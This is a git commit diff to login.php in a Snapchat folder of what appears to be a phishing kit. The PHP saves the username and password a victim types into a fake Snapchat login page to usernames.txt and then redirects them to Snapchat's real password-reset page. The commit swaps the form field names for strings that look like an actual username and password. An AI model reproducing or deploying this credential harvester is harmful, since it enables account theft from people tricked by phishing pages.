8948f7258a7996bbb78c046b43ce48736085b17a
Limanii <114448814+Limanii@users.noreply.github.com>
2022-09-27 01:05:10 +0200

    Update login.php

--- .sites/snapchat/login.php
+++ .sites/snapchat/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['dylan_molly21'] . " Pass: " . $_POST['testest'] . "\n", FILE_APPEND);
 header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
 exit();
 ?>
